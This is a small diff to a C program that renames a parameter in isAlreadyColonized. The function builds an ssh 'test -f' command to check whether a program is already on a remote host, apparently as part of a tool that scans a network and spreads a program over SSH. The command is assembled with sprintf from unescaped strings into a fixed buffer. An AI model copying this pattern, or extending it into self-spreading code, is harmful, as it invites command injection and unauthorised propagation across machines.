@@ -189,18 +189,18 @@ struct in_addr* scanNetwork(char *adminIP, char *broadcastAddr, int portSSH)
 	return resultIP;
 }
 
-bool isAlreadyColonized(char *host, char *programName, char *ssh, int portSSH, char *targetPath)
+bool isAlreadyColonized(char *host, char *programName, char *ssh, int portSSH, char *dstDir)
 {
 	bool ret = false;
 	char command[4096];
 	char *programPath;
 
 	// init
-	programPath = (char *) malloc(strlen(targetPath) + strlen(programName) + 1);
+	programPath = (char *) malloc(strlen(dstDir) + strlen(programName) + 1);
 	if (programPath == NULL)
 		return ret;
 	// concat the target path for the program with the program name
-	strcpy(programPath, targetPath);
+	strcpy(programPath, dstDir);
 	strcat(programPath, programName);
 	sprintf(command, "%s -p %d %s \"test -f %s\"", ssh, portSSH, host, programPath);
 	free(programPath);
